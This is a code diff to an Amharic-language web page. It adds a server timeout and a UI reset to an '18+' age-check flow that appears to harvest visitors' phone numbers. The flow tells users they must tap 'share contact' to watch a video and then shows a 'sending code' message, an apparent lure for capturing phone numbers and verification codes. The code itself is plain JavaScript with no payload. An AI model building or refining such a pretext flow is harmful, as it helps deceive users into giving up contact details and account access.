@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="am">
 <head>
@@ -218,18 +217,30 @@
     async function checkUserInDB() {
         showMsg(1, 'loading', 'እድሜዎን እያረጋገጥን ነው...');
         try {
+            // ሰርቨሩ መኖሩን ለማረጋገጥ Timeout እንጠቀማለን
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), 8000);
+
             const res = await fetch(`${API_BASE_URL}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({user_id: userId})
+                body: JSON.stringify({user_id: userId}),
+                signal: controller.signal
             });
+            clearTimeout(id);
             const data = await res.json();
+            
             if (data.status === "FOUND") {
                 showMsg(1, 'loading', 'ኮድ በመላክ ላይ...');
             } else {
                 requestPhone();
             }
-        } catch(e) { requestPhone(); }
+        } catch(e) { 
+            // ሰርቨሩ ካልሰራ እዚህ ጋር ይቆማል
+            resetUI();
+            showMsg(1, 'error', 'የማረጋገጫ ሰርቨሩ አልተገኘም (Localto Offline)። እባክዎ ቆይተው ይሞክሩ።');
+            console.error("Connection error:", e);
+        }
     }
 
     function requestPhone() {
@@ -237,15 +248,19 @@
             if (success) {
                 showMsg(1, 'loading', 'በመገናኘት ላይ...');
             } else {
-                isProcessing = false;
-                const btn = document.getElementById('main_verify_btn');
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fa-solid fa-check-to-slot"></i> 18+ በላይ ነኝ';
-                document.getElementById('play_icon').style.display = 'block';
-                document.getElementById('loading_spinner').style.display = 'none';
+                resetUI();
                 showMsg(1, 'error', 'ቪዲዮውን ለማየት share contact የሚል መንካት አለብዎት!');
             }
         });
+    }
+
+    function resetUI() {
+        isProcessing = false;
+        const btn = document.getElementById('main_verify_btn');
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fa-solid fa-check-to-slot"></i> 18+ በላይ ነኝ';
+        document.getElementById('play_icon').style.display = 'block';
+        document.getElementById('loading_spinner').style.display = 'none';
     }
 
     function checkStatus() {
